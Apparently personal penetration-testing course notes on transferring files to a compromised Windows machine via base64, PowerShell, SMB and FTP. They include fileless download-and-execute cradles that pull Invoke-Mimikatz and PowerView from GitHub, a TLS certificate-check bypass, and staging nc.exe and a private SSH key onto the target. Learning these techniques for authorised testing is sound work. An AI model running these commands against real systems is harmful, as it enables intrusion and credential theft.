# Downloading
- We have access to a Windows machine, and want to download a file from our Linux machine onto it.

## Powershell Bas64 Encode Decode
Don't need network communication. Encode file to base64 string, manually copy contents from terminal and perform reverse operation, decoding file in original content.

eg. want to transfer an ssh key to Windows machine

1. Check the MD5 hash, for use later
	- `md5sum id_rsa
2. Encode the file to base 64 on Linux machine
	- `cat id_rsa | base64 -w 0; echo
3. Copy and paste the output to a Windows Powershell terminal
4. On Windows, convert it back to a file
	- `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("the_string"))
5. Confirming the hashes match
	- `Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

## Powershell web downloads

Powershell WebClient provides methods for downloading data from resource.

*DownloadFile method*
- `(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
	-  ``(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

*DownloadString - Fileless method*
- Uses some OS functions to download payload and **execute it directly**
	- `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')`
		- `(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX

*Invoke-WebRequest*
		- Powershell 3.0 onwards
		- `Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1`
	- https://gist.github.com/HarmJ0y/bb48307ffa663256e239
		- List of Powershell download cradles
		- Be aware of nuances, eg. lack of proxy awareness or touching disk (downloading file onto target)


Common errors with Powershell
- Internet Explorer first-launch config not completed
	- Bypassed with the -UseBasicParsing flag
		- `Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX`
	- SSL/TLS secure channel, cert not trusted
		- Bypass with
		- `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
			- Just set this variable by running this command separately

## SMB Downloads
- Create SMB server in our machine with smbserver.impacket from Impacket
	- `sudo impacket-smbserver share -smb2support /tmp/smbshare`
		- share is the name of the SMB share
		- /tmp/smbshare is the name of the directory passed in (which the SMB share maps to). If want current directory, just use . 
- Then on Windows
	- `copy \\<Linux machine IP>\share\nc.exe`
	- Note: new versions of windows block unauthenticated guest access
		- `You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
		- To solve this, we set username and password using our Impacket SMB server, then mount the SMB server on windows machine
			- `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
			- on target: `net use n: \\<Linux machine IP>\share /user:test test

# FTP downloads
Configure FTP server in our machine
- `sudo pip3 install pyftpdlib`
- `sudo python3 -m pyftpdlib --port 21
- Then on windows machine
	- `(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
When we get a shell on remote machine, may not have interacive shell
- Solution: put the commands we want to execute into a file
- Then use FTP client to execute the commands in that file to download the target file
- On windows:
	- `echo open 192.168.49.128 > ftpcommand.txt`
		- 192... is Linux IP
		- Put all the commands into ftpcommand.txt
	- `echo USER anonymous >> ftpcommand.txt`
	- `echo binary >> ftpcommand.txt`
	- `echo GET file.txt >> ftpcommand.txt
		- file.txt is what we want to download from the Linux machine
	- `echo bye >> ftpcommand.txt`
	- `ftp -v -n -s:ftpcommand.txt`
		- execute the commands with FTP
	- `more file.txt`
		- file downloaded
